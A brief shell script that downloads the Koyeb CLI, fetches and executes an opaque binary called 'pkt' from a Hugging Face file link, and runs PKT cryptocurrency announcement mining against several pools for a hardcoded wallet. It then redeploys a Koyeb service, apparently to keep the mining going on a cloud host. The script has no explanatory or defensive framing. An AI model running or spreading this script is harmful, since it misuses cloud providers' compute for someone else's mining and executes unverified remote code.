wget https://github.com/koyeb/koyeb-cli/releases/download/v2.6.1/koyeb-cli_2.6.1_linux_amd64.tar.gz
tar zxvf koyeb-cli_2.6.1_linux_amd64.tar.gz
wget https://huggingface.co/myfiles/data/resolve/main/pkt
chmod +x pkt
timeout 29m ./pkt ann pkt1q72ngkxufus0kndcts37zjjqk7rrvg4plc6j6k0 http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world https://stratum.zetahash.com
./koyeb --config $(pwd)/.koyeb.yaml service redeploy app/app
